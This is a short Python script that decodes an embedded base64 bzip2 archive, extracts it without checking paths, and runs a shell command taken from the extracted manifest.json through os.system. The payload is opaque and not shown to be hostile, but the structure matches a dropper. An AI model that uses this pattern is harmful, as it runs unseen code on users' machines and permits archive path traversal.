#!/usr/bin/python
import tarfile
import os
import base64
import json
import sys

tar_data = "QlpoOTFBWSZTWfrXPKAAANF7mM4wAIBSBf+QDApv99/qBAAACCAIMADVIJUTITAhoxBk0AaB6RmpoJRExR6jQA0GhiGgAAGA0BoAANNBoBoA0UBX4vDj8RUAFgACTYXDwyGPKrGkAviiIDgiAwThRYxdOQIBhdYOseJ1DtVNkdr71ZIggeWgaUhiASrZcKRRJAlRgxCdTRRIRnHCbVICqrUYGslshVae5HRHkAa+I48uYcA74Cv0GYmk1e2KYkHbrAfUtTV/I4r8YehegcXyytl0d4zPCQpfiO1qW5hH4rKJ5gFyNMX4asROPk3ksxLKOV0vCEB/F3JFOFCQ+tc8oA=="

tar = open("bundle.tar.bz2", "w")
tar.write(base64.b64decode(tar_data))
tar.close()

with tarfile.open("bundle.tar.bz2", "r:bz2") as tar:
    tar.extractall()

os.unlink("bundle.tar.bz2")
manifest = json.load(open("manifest.json", "r"))
sys.exit(os.system(manifest['execute']))

#os.unlink("bundle.tar.bz2")
